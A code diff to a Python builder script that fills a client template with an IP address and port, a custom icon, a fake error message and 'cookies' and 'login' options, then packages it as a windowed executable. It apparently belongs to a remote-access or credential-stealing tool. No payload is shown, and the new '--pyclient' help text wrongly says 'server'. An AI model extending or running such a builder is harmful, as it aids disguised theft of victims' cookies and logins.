@@ -40,7 +40,7 @@ def create_executable(filename, icon, mode="windowed"):
     ])
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False, port=80):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False, port=80, include_python=False):
     reset_folders()
     os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
@@ -57,6 +57,8 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
+        if include_python:
+            shutil.copyfile(build_path, f"{dist_path}.py")
         create_executable(filename, icon)
         if os.path.exists(dist_path):
             shutil.rmtree(dist_path)
@@ -150,6 +152,8 @@ def parse_arguments():
     parser.add_argument('--server', dest="server",
                         action="store_true", default=False, help="Use to only build the server. Default is both client and server")
     parser.add_argument('--pyserver', dest="pyserver",
+                        action="store_true", default=False, help="Creates a python version of the server instead of an executable")
+    parser.add_argument('--pyclient', dest="pyclient",
                         action="store_true", default=False, help="Creates a python version of the server instead of an executable")
 
     args = parser.parse_args()
